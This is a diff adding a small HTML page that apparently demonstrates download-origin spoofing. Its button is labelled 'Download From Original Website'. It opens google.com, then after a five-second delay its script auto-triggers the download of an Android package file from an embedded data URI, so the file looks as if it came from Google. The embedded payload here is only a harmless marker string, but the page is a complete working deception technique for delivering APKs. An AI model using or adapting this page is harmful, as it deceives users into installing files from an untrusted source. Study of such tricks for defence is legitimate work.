@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download</title>
+</head>
+
+<body>
+    <h1>Click the button to download File from Google</h1>
+
+    <br>
+
+    <p>Not Spoof : <a href="https://kokurate.github.io/browser/rar-android-722.132.apk">Show the origin</a></p>
+
+    <hr>
+    <br><br>
+    <hr>
+
+    <p>Spoof : <input type="button" onclick="openWin();" value="Download From Original Website" /></p>
+
+
+    <script>
+        function Puf(uri, name) {
+            var link = document.createElement("a");
+            link.download = name;
+            link.href = uri;
+            link.click();
+        }
+
+        function openWin() {
+            window.open("https://www.google.com", "_blank");
+
+            setTimeout(function () {
+                Puf("data:application/vnd.android.package-archive;base64,cHduZWQgYnkga29rdXJhdGU=", "apk.puf")
+            }, 5000);
+        }
+    </script>
+</body>
+
+</html>
